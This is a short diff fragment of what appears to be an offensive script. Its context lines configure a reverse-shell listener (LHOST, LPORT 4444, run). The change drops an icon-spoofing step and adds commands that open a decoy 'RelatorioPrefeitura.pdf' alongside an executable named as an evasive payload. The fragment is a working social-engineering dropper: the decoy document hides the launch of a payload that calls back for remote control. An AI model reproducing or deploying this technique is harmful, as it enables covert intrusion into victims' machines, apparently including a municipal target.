@@ -31,4 +31,6 @@ set LHOST 192.168.1.137
 set LPORT 4444
 run
 
-wine rcedit-x64.exe atibaia_payload_evasivo.exe --set-icon icone_pdf.ico
+start RelatorioPrefeitura.pdf
+start atibaia_payload_evasivo.exe
+
